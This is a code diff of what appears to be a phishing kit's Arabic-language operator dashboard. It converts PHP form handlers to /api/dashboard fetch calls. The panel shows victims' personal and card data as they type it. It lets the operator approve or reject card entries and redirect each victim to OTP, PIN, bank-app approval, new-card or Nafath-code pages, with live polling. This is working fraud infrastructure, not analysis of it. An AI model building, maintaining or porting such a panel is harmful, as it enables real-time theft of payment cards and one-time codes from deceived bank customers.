@@ -1,34 +1,3 @@
-
-<?php
-session_start();
-require_once __DIR__ . '/../config.php';
-
-if (!isset($_SESSION['admin_logged_in']) || $_SESSION['admin_logged_in'] !== true) {
-    header('Location: login.php');
-    exit;
-}
-
-// Handle delete user
-if (isset($_POST['deleteUser']) && isset($_POST['userId'])) {
-    $uid = intval($_POST['userId']);
-    supabase_delete('cards', 'user_id=eq.' . $uid);
-    supabase_delete('users', 'id=eq.' . $uid);
-    header('Location: index.php');
-    exit;
-}
-
-// Handle delete all users
-if (isset($_POST['deleteAllUser'])) {
-    supabase_delete('cards', 'id=gt.0');
-    supabase_delete('users', 'id=gt.0');
-    header('Location: index.php');
-    exit;
-}
-
-// Load users
-$users = supabase_get('users', '', '*', 'created_at.desc');
-if (!is_array($users)) $users = [];
-?>
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 
@@ -547,7 +516,7 @@ if (!is_array($users)) $users = [];
             <div class="stat-item">
                 <i class="fas fa-inbox"></i>
                 <span>الوارد</span>
-                <span class="stat-num" id="inboxCount"><?php echo count($users); ?></span>
+                <span class="stat-num" id="inboxCount">0</span>
             </div>
             <div class="stat-item">
                 <i class="fas fa-wifi"></i>
@@ -561,12 +530,10 @@ if (!is_array($users)) $users = [];
             </div>
         </div>
         <div class="nav-actions">
-            <form action="" method="POST" style="margin:0;display:inline;">
-                <button type="submit" name="deleteAllUser" class="btn-delete-all-nav">
-                    <i class="fas fa-trash-alt"></i> حذف الكل
-                </button>
-            </form>
-            <a href="logout.php"><i class="fas fa-sign-out-alt"></i> خروج</a>
+            <button type="button" class="btn-delete-all-nav" onclick="deleteAllUsers()">
+                <i class="fas fa-trash-alt"></i> حذف الكل
+            </button>
+            <a href="/api/dashboard/logout"><i class="fas fa-sign-out-alt"></i> خروج</a>
         </div>
     </div>
 
@@ -576,7 +543,7 @@ if (!is_array($users)) $users = [];
         <div class="mail-list-panel">
             <div class="mail-list-header">
                 <h6><i class="fas fa-inbox"></i> صندوق الوارد</h6>
-                <span class="inbox-count" id="inboxCount2"><?php echo count($users); ?></span>
+                <span class="inbox-count" id="inboxCount2">0</span>
             </div>
             <!-- Search Box -->
             <div class="search-box">
@@ -586,37 +553,8 @@ if (!is_array($users)) $users = [];
                 </div>
             </div>
             <div class="mail-list-scroll" id="result">
-                <?php foreach ($users as $user):
-                    $uid = $user['id'];
-                    $uname = htmlspecialchars($user['username'] ?? '');
-                    $initial = mb_substr($uname ?: '?', 0, 1);
-                    $msg = htmlspecialchars($user['message'] ?? '');
-                    $pg = htmlspecialchars($user['page'] ?? '');
-                    $addr = htmlspecialchars($user['address'] ?? '');
-                    $time = isset($user['created_at']) ? date('H:i', strtotime($user['created_at'])) : '';
-                    $online = !empty($user['is_online']);
-                ?>
-                    <div class="mail-row unread" data-user-id="<?php echo $uid; ?>" data-username="<?php echo $uname; ?>" id="mailRow<?php echo $uid; ?>" onclick="selectUser(<?php echo $uid; ?>, this)">
-                        <div class="row-avatar">
-                            <?php echo $initial; ?>
-                            <div class="status-dot <?php echo $online ? 'online' : ''; ?>" id="status<?php echo $uid; ?>"></div>
-                        </div>
-                        <div class="row-info">
-                            <div class="row-name" id="name<?php echo $uid; ?>"><?php echo $uname; ?></div>
-                            <div class="row-preview">
-                                <span id="message<?php echo $uid; ?>"><?php echo $msg; ?></span>
-                                <span class="msg-badge" id="page<?php echo $uid; ?>"><?php echo $pg; ?></span>
-                                <span class="address-badge" id="addr<?php echo $uid; ?>" <?php echo empty($addr) ? 'style="display:none;"' : ''; ?>><?php echo $addr; ?></span>
-                            </div>
-                        </div>
-                        <div class="row-time"><?php echo $time; ?></div>
-                        <form action="" method="POST" style="margin:0;" onclick="event.stopPropagation();">
-                            <button type="submit" name="deleteUser" class="row-delete" title="حذف"><i class="fas fa-trash"></i></button>
-                            <input type="hidden" name="userId" value="<?php echo $uid; ?>">
-                        </form>
-                    </div>
-                <?php endforeach; ?>
-                </div>
+                <!-- Filled by JS polling -->
+            </div>
         </div>
 
         <!-- Left: Detail Panel -->
@@ -639,10 +577,7 @@ if (!is_array($users)) $users = [];
                     <div class="detail-actions">
                         <button class="btn-act-card" id="btnCard" onclick="showCardInfo()"><i class="fas fa-credit-card"></i> البطاقة</button>
                         <button class="btn-act-redirect" id="btnRedirect" onclick="showRedirectPanel()"><i class="fas fa-directions"></i> توجيه</button>
-                        <form action="" method="POST" style="margin:0;display:inline;" id="deleteForm">
-                            <button type="submit" name="deleteUser" class="btn-act-delete"><i class="fas fa-trash"></i> حذف</button>
-                            <input type="hidden" name="userId" id="deleteUserId" value="">
-                        </form>
+                        <button type="button" class="btn-act-delete" onclick="deleteUser(selectedUserId)"><i class="fas fa-trash"></i> حذف</button>
                     </div>
                 </div>
                 <!-- Detail Body -->
@@ -658,6 +593,37 @@ if (!is_array($users)) $users = [];
 
     <script>
     var selectedUserId = null;
+
+    // === Delete user via API ===
+    function deleteUser(userId) {
+        if (!userId) return;
+        if (!confirm('هل أنت متأكد من حذف هذا المستخدم؟')) return;
+        fetch('/api/dashboard/delete-user', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ userId: userId })
+        }).then(function() {
+            var row = document.getElementById('mailRow' + userId);
+            if (row) row.remove();
+            if (selectedUserId === userId) closeDetail();
+            var idx = knownUserIds.indexOf(userId);
+            if (idx > -1) knownUserIds.splice(idx, 1);
+        });
+    }
+
+    function deleteAllUsers() {
+        if (!confirm('هل أنت متأكد من حذف جميع المستخدمين؟')) return;
+        fetch('/api/dashboard/delete-all', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ deleteAllUser: true })
+        }).then(function() {
+            document.getElementById('result').innerHTML = '';
+            knownUserIds = [];
+            lastInputAt = {};
+            closeDetail();
+        });
+    }
 
     // === Search / Filter ===
     function filterUsers() {
@@ -676,25 +642,18 @@ if (!is_array($users)) $users = [];
     }
 
     function selectUser(userId, el) {
-        // Mark as read
         el.classList.remove('unread');
-
-        // Remove active from all
         document.querySelectorAll('.mail-row').forEach(function(r) { r.classList.remove('active'); });
         el.classList.add('active');
 
         selectedUserId = userId;
-        document.getElementById('deleteUserId').value = userId;
 
-        // Show detail panel
         document.getElementById('detailEmpty').style.display = 'none';
         var dc = document.getElementById('detailContent');
         dc.style.display = 'flex';
 
-        // Mobile
         document.getElementById('detailPanel').classList.add('show-mobile');
 
-        // Load user info
         loadUserDetail(userId);
     }
 
@@ -710,8 +669,7 @@ if (!is_array($users)) $users = [];
         var body = document.getElementById('detailBody');
         body.innerHTML = '<div style="text-align:center;padding:40px;color:#94a3b8;"><i class="fas fa-spinner fa-spin" style="font-size:30px;"></i><p style="margin-top:10px;">جاري التحميل...</p></div>';
 
-        // Load user info
-        fetch('user-info.php?id=' + userId)
+        fetch('/api/dashboard/user-info?id=' + userId)
             .then(function(r) { return r.json(); })
             .then(function(user) {
                 if (user.error) {
@@ -726,7 +684,6 @@ if (!is_array($users)) $users = [];
 
                 var html = '';
 
-                // Personal Info Section
                 html += '<div class="info-section">';
                 html += '<h6><i class="fas fa-user"></i> البيانات الشخصية</h6>';
                 html += '<table class="info-table">';
@@ -738,21 +695,19 @@ if (!is_array($users)) $users = [];
                 html += '<tr><th>تاريخ التسجيل</th><td>' + (user.created_at || '-') + '</td></tr>';
                 html += '</table></div>';
 
-                // Card Info Section (loaded separately)
                 html += '<div class="info-section" id="cardSection">';
                 html += '<h6><i class="fas fa-credit-card"></i> بيانات البطاقة</h6>';
                 html += '<div id="cardInfoContent"><div style="text-align:center;color:#94a3b8;padding:10px;"><i class="fas fa-spinner fa-spin"></i> جاري التحميل...</div></div>';
                 html += '</div>';
 
-                // Card Actions
                 html += '<div class="action-section">';
                 html += '<h6><i class="fas fa-check-circle"></i> إجراءات البطاقة</h6>';
                 html += '<div style="margin-bottom:12px;">';
                 html += '<select class="form-select" id="selUrl' + userId + '" style="margin-bottom:10px;">';
-                html += '<option value="otp.php" selected>OTP</option>';
-                html += '<option value="s.php">الموافقة من التطبيق البنكي</option>';
-                html += '<option value="payment.php">البطاقة</option>';
-                html += '<option value="payment2.php">طلب بطاقة جديدة</option>';
+                html += '<option value="otp.html" selected>OTP</option>';
+                html += '<option value="s.html">الموافقة من التطبيق البنكي</option>';
+                html += '<option value="payment.html">البطاقة</option>';
+                html += '<option value="payment2.html">طلب بطاقة جديدة</option>';
                 html += '</select>';
                 html += '</div>';
                 html += '<div class="action-btns">';
@@ -760,26 +715,24 @@ if (!is_array($users)) $users = [];
                 html += '<button class="btn-reject" onclick="callRequest(' + userId + ', 2, ' + userId + ')"><i class="fas fa-times"></i> رفض</button>';
                 html += '</div></div>';
 
-                // Redirect Section
                 html += '<div class="action-section" id="redirectSection">';
                 html += '<h6><i class="fas fa-directions"></i> إعادة التوجيه</h6>';
                 html += '<select class="form-select" id="selaaUrl' + userId + '" style="margin-bottom:10px;">';
-                html += '<option value="index.php" selected>صفحة معلومات التسجيل</option>';
-                html += '<option value="payment.php">صفحة البطاقة</option>';
-                html += '<option value="otp.php">رمز OTP</option>';
-                html += '<option value="password.php">رمز سري</option>';
-                html += '<option value="payment2.php">طلب بطاقة جديدة</option>';
-                html += '<option value="s.php">الموافقة من التطبيق البنكي</option>';
+                html += '<option value="index-details.html" selected>صفحة معلومات التسجيل</option>';
+                html += '<option value="payment.html">صفحة البطاقة</option>';
+                html += '<option value="otp.html">رمز OTP</option>';
+                html += '<option value="password.html">رمز سري</option>';
+                html += '<option value="payment2.html">طلب بطاقة جديدة</option>';
+                html += '<option value="s.html">الموافقة من التطبيق البنكي</option>';
                 html += '</select>';
                 html += '<div class="action-btns">';
                 html += '<button class="btn-otp" onclick="callaaRequest(' + userId + ')"><i class="fas fa-paper-plane"></i> توجيه</button>';
-                html += '<button class="btn-payment" onclick="redirectUser(' + userId + ', \'otp.php\')"><i class="fas fa-key"></i> OTP</button>';
-                html += '<button class="btn-payment" onclick="redirectUser(' + userId + ', \'payment.php\')"><i class="fas fa-credit-card"></i> البطاقة</button>';
+                html += '<button class="btn-payment" onclick="redirectUser(' + userId + ', \'otp.html\')"><i class="fas fa-key"></i> OTP</button>';
+                html += '<button class="btn-payment" onclick="redirectUser(' + userId + ', \'payment.html\')"><i class="fas fa-credit-card"></i> البطاقة</button>';
                 html += '</div></div>';
 
                 body.innerHTML = html;
 
-                // Load card info
                 loadCardInfo(userId);
             })
             .catch(function(err) {
@@ -788,7 +741,7 @@ if (!is_array($users)) $users = [];
     }
 
     function loadCardInfo(userId) {
-        fetch('card-id.php?id=' + userId)
+        fetch('/api/dashboard/card-id?id=' + userId)
             .then(function(r) { return r.json(); })
             .then(function(cards) {
                 var container = document.getElementById('cardInfoContent');
@@ -850,7 +803,7 @@ if (!is_array($users)) $users = [];
                 selectedValue += '?reject=1';
             }
             $.ajax({
-                url: 'action-code.php',
+                url: '/api/dashboard/action-code',
                 type: 'GET',
                 data: {
                     user_id: id,
@@ -859,14 +812,13 @@ if (!is_array($users)) $users = [];
                 },
                 success: function(response) {
                     $.ajax({
-                        url: 'trigger-page.php',
+                        url: '/api/dashboard/trigger-page',
                         method: 'POST',
                         data: {
                             userId: userId,
                             page: selectedValue
                         },
                         success: function() {
-                            // Reload card info
                             loadCardInfo(userId);
                         }
                     });
@@ -888,12 +840,12 @@ if (!is_array($users)) $users = [];
                 selectedValue += '?reject=1';
             }
 
-            if (selectedValue == "StepFifth.php") {
+            if (selectedValue == "StepFifth.html") {
                 selectedValue += '?code=' + codeNafathValue;
             }
 
             $.ajax({
-                url: 'action-code-nafath.php',
+                url: '/api/dashboard/action-code-nafath',
                 type: 'GET',
                 data: {
                     user_id: id,
@@ -909,7 +861,7 @@ if (!is_array($users)) $users = [];
 
         function redirectUser(userId, page) {
             $.ajax({
-                url: 'trigger-page.php',
+                url: '/api/dashboard/trigger-page',
                 method: 'POST',
                 data: {
                     userId: userId,
@@ -927,7 +879,7 @@ if (!is_array($users)) $users = [];
             var selectedValue = selectElement.value;
 
             $.ajax({
-                url: 'trigger-page.php',
+                url: '/api/dashboard/trigger-page',
                 method: 'POST',
                 data: {
                     userId: userId,
@@ -945,12 +897,6 @@ var knownUserIds = [];
 var lastInputAt = {};
 var isPolling = false;
 
-document.querySelectorAll('.mail-row[data-user-id]').forEach(function(item) {
-    var uid = parseInt(item.getAttribute('data-user-id'));
-    knownUserIds.push(uid);
-    lastInputAt[uid] = '';
-});
-
 function buildUserRow(user) {
     var uid = user.id;
     var initial = (user.username || '?').charAt(0);
@@ -967,10 +913,7 @@ function buildUserRow(user) {
             '</div>' +
         '</div>' +
         '<div class="row-time">' + (user.created_at || '').substring(11, 16) + '</div>' +
-        '<form action="" method="POST" style="margin:0;" onclick="event.stopPropagation();">' +
-            '<button type="submit" name="deleteUser" class="row-delete" title="حذف"><i class="fas fa-trash"></i></button>' +
-            '<input type="hidden" name="userId" value="' + uid + '">' +
-        '</form>' +
+        '<button type="button" class="row-delete" title="حذف" onclick="event.stopPropagation(); deleteUser(' + uid + ')"><i class="fas fa-trash"></i></button>' +
     '</div>';
 }
 
@@ -978,7 +921,7 @@ function startDashboardPolling() {
     if (isPolling) return;
     isPolling = true;
 
-    fetch('polling-dashboard.php')
+    fetch('/api/dashboard/polling-dashboard')
         .then(function(r) { return r.json(); })
         .then(function(data) {
             var newData = JSON.stringify(data);
@@ -1031,7 +974,6 @@ function startDashboardPolling() {
                     if (userItem) {
                         userItem.classList.add('unread');
                     }
-                    // Refresh detail if this user is selected
                     if (selectedUserId === uid) {
                         loadUserDetail(uid);
                     }
@@ -1045,13 +987,11 @@ function startDashboardPolling() {
                 if (nameEl && nameEl.textContent.trim() !== (user.username || '').trim()) {
                     nameEl.textContent = user.username || '';
                 }
-                // تحديث العنوان تلقائياً
                 var addrEl = document.getElementById('addr' + uid);
                 if (addrEl && user.address) {
                     addrEl.textContent = user.address;
                     addrEl.style.display = '';
                 }
-                // تحديث data-username للبحث
                 if (userItem) {
                     userItem.setAttribute('data-username', user.username || '');
                 }
@@ -1067,7 +1007,6 @@ function startDashboardPolling() {
                 }
             });
 
-            // Update counts
             var count = container.querySelectorAll('.mail-row[data-user-id]').length;
             var ic = document.getElementById('inboxCount');
             var ic2 = document.getElementById('inboxCount2');
@@ -1089,7 +1028,7 @@ setInterval(startDashboardPolling, 800);
 
 <script>
 function fetchStats() {
-    fetch('stats.php')
+    fetch('/api/dashboard/stats')
         .then(function(r) { return r.json(); })
         .then(function(data) {
             document.getElementById('onlineCount').textContent = data.online_count;
